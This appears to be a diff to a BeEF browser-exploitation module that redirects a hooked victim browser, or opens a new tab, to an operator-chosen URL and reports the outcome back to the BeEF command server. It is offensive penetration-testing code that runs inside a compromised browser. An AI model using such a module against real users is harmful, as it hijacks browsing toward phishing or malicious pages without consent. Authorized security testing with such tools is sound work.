@@ -5,9 +5,16 @@
 //
 
 beef.execute(function() {
+	var redirectUrl = "<%= @redirect_url %>";
+	var openNewTab = "<%= @open_new_tab %>" === "true";
 
-	window.location = "<%= @redirect_url %>";
-	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Redirected to: <%= @redirect_url %>');
+	if (openNewTab) {
+		window.open(redirectUrl, '_blank', 'noopener,noreferrer');
+	} else {
+		window.location = redirectUrl;
+	}
+
+	beef.net.send('<%= @command_url %>', <%= @command_id %>,
+		'result=' + encodeURIComponent((openNewTab ? 'Opened new tab: ' : 'Redirected: ') + redirectUrl));
 
 });
-
